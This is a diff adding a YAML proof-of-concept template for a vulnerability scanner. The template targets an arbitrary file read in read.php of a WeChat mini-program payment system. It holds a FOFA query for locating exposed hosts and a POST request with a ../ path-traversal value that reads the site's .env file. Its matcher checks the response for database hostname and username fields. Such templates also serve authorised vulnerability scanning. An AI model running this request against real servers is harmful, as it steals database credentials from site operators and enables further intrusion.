@@ -1,0 +1,18 @@
+id: poc-yaml-meituan-daifu-mini-program-read-php-anyfile-read
+info:
+  name: 美团代付三合一微信小程序系统 read.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 美团代付三合一微信小程序系统
+  fofa: body="/h5/static/js/chunk-vendors.js"
+requests:
+- method: POST
+  path: /static/ueditor22/_test/tools/br/read.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=../../../../../../.env
+  expression: status_code == 200 && contains(body,"[DATABASE]") && contains(body,"USERNAME
+    =") && contains(body,"HOSTNAME =") && !contains(body,"<")
+variables: {}
+transport: http
